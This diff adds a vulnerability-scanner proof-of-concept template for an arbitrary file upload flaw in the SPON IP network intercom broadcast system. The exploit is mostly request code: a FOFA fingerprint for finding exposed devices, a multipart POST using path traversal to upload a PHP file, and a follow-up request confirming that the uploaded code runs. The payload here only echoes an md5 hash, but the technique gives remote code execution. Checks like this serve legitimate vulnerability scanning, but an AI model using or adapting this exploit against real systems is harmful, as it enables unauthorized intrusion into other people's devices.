@@ -1,0 +1,45 @@
+id: poc-yaml-spon-addmediadata-php-anyfile-upload
+info:
+  name: 世邦通信SPON-IP网络对讲广播系统 addmediadata.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: IP网络对讲广播系统
+  fofa: icon_hash="-1830859634"
+variables:
+  t1: random_str(4)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /php/addmediadata.php
+  headers:
+    Content-Type: multipart/form-data;boundary=de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
+  data: '--de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
+
+    Content-Disposition: form-data; name="fullpath"
+
+
+    ../
+
+    --de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
+
+    Content-Disposition: form-data; name="subpath"
+
+
+    /
+
+    --de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.php"
+
+    Content-Type: application/octet-stream
+
+
+    <?php echo md5({{.t1}});?>
+
+    --de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828--'
+  expression: status_code == 200 && contains(body,"\"file\":") && contains(body,".php")
+- method: GET
+  path: /{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
